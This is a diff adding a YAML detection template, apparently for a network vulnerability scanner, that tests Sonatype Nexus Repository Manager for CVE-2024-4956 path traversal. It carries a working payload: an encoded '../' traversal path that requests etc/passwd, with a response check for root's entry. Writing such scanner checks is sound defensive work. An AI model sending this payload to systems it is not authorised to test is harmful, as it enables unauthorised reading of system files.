@@ -1,0 +1,70 @@
+info:
+  name: nexus_cve_2024_4956_vuln
+  author: Prajwal G N (@Prajwal5755)
+  severity: 7.5
+  description: Detects Sonatype Nexus Repository Manager CVE-2024-4956 unauthenticated path traversal allowing arbitrary file read.
+
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-4956
+    - https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16
+
+  profiles:
+    - vuln
+    - http
+    - nexus
+    - cve
+    - cve2024
+    - high_severity
+    
+
+payloads:
+  - library: http
+    steps:
+
+      - method: get
+        timeout: 5
+
+        headers:
+          User-Agent: "{user_agent}"
+
+        ssl: false
+
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}{{path}}"
+
+            prefix: ""
+            interceptors: []
+            suffix: ""
+
+            data:
+              schema:
+                - "http"
+                - "https"
+
+              ports:
+                - 80
+                - 443
+                - 8081
+
+              path:
+                - "/%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+
+
+
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            
+            headers:
+              Content-Type:
+                regex: "^application/octet-stream$"
+                reverse: false
+
+            content:
+              regex: "root:.:0:0:"
+              reverse: false
